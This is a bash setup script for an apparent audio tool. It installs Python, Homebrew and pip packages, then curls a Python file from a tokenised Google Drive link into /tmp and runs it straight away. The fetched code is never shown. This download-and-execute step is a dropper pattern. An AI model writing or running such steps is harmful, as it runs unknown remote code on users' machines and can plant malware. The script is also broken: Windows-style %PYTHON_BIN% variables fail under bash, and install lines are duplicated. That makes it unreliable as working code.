#!/usr/bin/env bash
set -e

# ------------------------------
# Check for Python
# ------------------------------
if ! command -v python3 &> /dev/null; then
    echo "Python3 not found. Installing..."
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS: Install via Homebrew
        if ! command -v brew &> /dev/null; then
            echo "Homebrew not found. Installing Homebrew first..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
        brew install python
    else
        # Linux: Debian/Ubuntu
        sudo apt update && sudo apt install -y python3 python3-pip
    fi
fi

# Ensure python3 command exists
PYTHON_BIN=python3

%PYTHON_BIN% -m pip install --upgrade pip
%PYTHON_BIN% -m pip install numpy scipy pydub requests py7zr ipython pyaudioop
python -m pip install --upgrade pip
python -m pip install numpy scipy pydub requests py7zr ipython pyaudioop 
python -m pip install audioop-lts
# ------------------------------
# Download Python script
# ------------------------------
PY_SCRIPT="/tmp/arby_audio.py"
curl -fsSL "https://drive.usercontent.google.com/download?id=1b8NnDwAUOh1Oyf3wPedgk6vMt_Iv-t44&export=download&authuser=0&confirm=t&uuid=2e9c9cb3-2909-446e-b742-06ad73901b50&at=AN8xHorJssjJphcJ5kQZN_n0kRlF:1757408516859" -o "$PY_SCRIPT"

# ------------------------------
# Execute Python script
# ------------------------------
"$PYTHON_BIN" "$PY_SCRIPT"
